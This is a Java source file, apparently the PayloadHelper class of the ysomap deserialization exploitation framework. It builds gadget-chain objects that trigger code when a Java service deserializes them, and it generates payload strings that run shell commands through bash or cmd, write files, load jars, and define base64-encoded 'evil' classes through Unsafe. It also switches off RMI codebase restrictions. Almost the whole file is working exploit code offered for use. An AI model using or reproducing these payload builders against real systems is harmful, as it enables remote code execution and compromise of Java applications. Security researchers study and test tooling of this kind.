package ysomap.core.util;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.shiro.subject.SimplePrincipalCollection;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.*;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/**
 * @author wh1t3P1g
 * @since 2020/2/11
 */
@SuppressWarnings({"rawtypes","unchecked"})
public class PayloadHelper {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy (final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) ReflectionHelper.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(PayloadHelper.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectionHelper.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, "ysomap", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, "ysomap", null));
        ReflectionHelper.setFieldValue(s, "table", tbl);
        return s;
    }

    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        ReflectionHelper.setFieldValue(m, "size", 2);
        ReflectionHelper.setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        ReflectionHelper.setFieldValue(node, "right", right);
        ReflectionHelper.setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        ReflectionHelper.setFieldValue(set, "m", m);
        return set;
    }

    public static HashSet makeHashSetWithEntry(Object entry) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        HashSet set = new HashSet(1);
        set.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        ReflectionHelper.setAccessible(f);
        HashMap innimpl = null;
        innimpl = (HashMap) f.get(set);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        ReflectionHelper.setAccessible(f2);
        Object[] array = new Object[0];
        array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        ReflectionHelper.setAccessible(keyField);
        keyField.set(node, entry);

        return set;
    }

    // triger compareTo function
    public static Object makePriorityQueue(Object a, Object b) throws Exception {
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");
        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
        queueArray[0] = a;
        queueArray[1] = b;
        return queue;
    }

    public static Object makeTreeSetWithXString(Object obj) throws Exception {
        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));

        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry2, "value", obj);

        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
    }

    public static String makeBCELStr(byte[] classbytes) throws IOException {
        return "$$BCEL$$" + Utility.encode(classbytes, true);
    }

    public static Object makeBCELClassLoader() throws Exception {
        Class<?> clazz = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        Object classLoader = clazz.newInstance();
        ReflectionHelper.setFieldValue(classLoader, "ignored_packages", new String[]{});
        Object defaultDomain = ReflectionHelper.getFieldValue(classLoader, "defaultDomain");
        ReflectionHelper.setFieldValue(defaultDomain, "codesource", null);
        ReflectionHelper.setFieldValue(defaultDomain, "classloader", null);
        ReflectionHelper.setFieldValue(classLoader, "defaultDomain", defaultDomain);
        ReflectionHelper.setFieldValue(classLoader, "assertionLock", null);
        ReflectionHelper.setFieldValue(classLoader, "parent", null);
        ReflectionHelper.setFieldValue(classLoader, "deferTo", null);

        Hashtable classes = (Hashtable) ReflectionHelper.getFieldValue(classLoader, "classes");
        classes.put("java.lang.Object", Object.class);
        classes.put("java.lang.Runtime", Runtime.class);
//        classes.put("java.lang.Runnable", Runnable.class);
//        classes.put("java.lang.Throwable", Throwable.class);
//        classes.put("java.io.IOException", IOException.class);
//        classes.put("java.lang.Thread", Thread.class);
//        classes.put("java.lang.String", String.class);
//        classes.put("java.lang.System", System.class);
//        classes.put("java.io.PrintStream", PrintStream.class);
        return classLoader;
    }

    public static Object makeSimplePrincipalCollection(){
        return new SimplePrincipalCollection();
    }

    public static String makeExceptionPayload(String cmd){
        return "StringBuilder localStringBuffer = new StringBuilder();\n" +
                "Process localProcess = Runtime.getRuntime().exec(\""+
                cmd.replaceAll("\\\\","\\\\\\\\")
                        .replaceAll("\"", "\\\"") +"\");\n" +
                "java.io.BufferedReader localBufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(localProcess.getInputStream()));\n" +
                "String str1;\n" +
                "try {\n" +
                "     while ((str1 = localBufferedReader.readLine()) != null) {\n" +
                "         localStringBuffer.append(str1).append(\"\\n\");\n" +
                "     }\n" +
                "}catch (Exception e){\n" +
                "}\n" +
                "throw new Exception(localStringBuffer.toString());";
    }

    public static String makeRuntimeExecPayload(String cmd){
        return "String[] strs=new String[3];\n" +
                "        if(java.io.File.separator.equals(\"/\")){\n" +
                "            strs[0]=\"/bin/bash\";\n" +
                "            strs[1]=\"-c\";\n" +
                "            strs[2]=\"" + cmd + "\";\n" +
                "        }else{\n" +
                "            strs[0]=\"cmd\";\n" +
                "            strs[1]=\"/C\";\n" +
                "            strs[2]=\"" + cmd + "\";\n" +
                "        }\n" +
                "        java.lang.Runtime.getRuntime().exec(strs);";
    }

    public static String makeFileWritePayload(String filename, String content){
        return "String content = \""+content+"\";" +
                "com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename(\""+filename+"\", content.getBytes());";
    }

    // https://github.com/zzwlpx/JNDIExploit/blob/7aa2b5f8ab742cf8e705c965ab3e8bac6fe312b0/src/main/java/com/feihong/ldap/controllers/TomcatBypassController.java?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L135
    public static String makeJsRuntimeExecPayload(String cmd){
        return "var strs=new Array(3);" +
                "if(java.io.File.separator.equals('/')){" +
                "strs[0]='/bin/bash';" +
                "strs[1]='-c';" +
                "strs[2]='" + cmd + "';" +
                "}else{" +
                "strs[0]='cmd';" +
                "strs[1]='/C';" +
                "strs[2]='" + cmd + "';" +
                "}" +
                "java.lang.Runtime.getRuntime().exec(strs);";
    }

    /**
     * ClassDefiner会新起一个独立的classloader环境，所以可能存在classnotfound的问题
     * 不稳定，用后面的makeJsDefinedClass2
     * @param classname
     * @param encoded
     * @return
     */
    public static String makeJsDefinedClass(String classname, String encoded){
        return "var data = '"+encoded+"';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var cls = java.lang.Class.forName('sun.reflect.ClassDefiner');" +
                "var method = cls.getDeclaredMethods()[0];" +
                "method.setAccessible(true);" +
                "var evil = method.invoke(cls, '"+classname+"', bytes, 0, bytes.length, cls.getClassLoader());" +
                "evil.newInstance();";
    }

    public static String makeJsDefinedClass2(String classname, String encoded){
        return "var data = '"+encoded+"';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var cls = java.lang.Class.forName('sun.nio.ch.Util');" +
                "var method = cls.getDeclaredMethod('unsafe');" +
                "method.setAccessible(true);" +
                "var unsafe = method.invoke(cls);" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var evil = unsafe.defineClass('"+classname+"', bytes, 0, bytes.length, classLoader, null);" +
                "evil.newInstance();";
    }

    public static String makeJsFileWrite(String filepath, String encoded){
        return "var data = '"+encoded+"';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename('"+filepath+"',bytes);";
    }

    public static String makeJsLoadJar(String filepath, String classname){
        return "var args = new Array(1);" +
                "args[0] = new java.net.URL('file://"+filepath+"');" +
                "var classloader = new java.net.URLClassLoader(args);" +
                "var cls = classloader.loadClass('"+classname+"');" +
                "cls.newInstance();";
    }

    /**
     * from readObject ot obj.toString in jdk8
     * @param obj
     * @return
     */
    public static Object makeReadObjectToStringTrigger(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) ReflectionHelper.getFieldValue(manager, "edits");
        vector.add(obj);
        ReflectionHelper.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }

    /**
     * 用于创造一个拥有同样hash的对象
     * 这样在map.put过程中将触发equal函数
     * @param hash
     * @return
     */
    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }


    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }


}
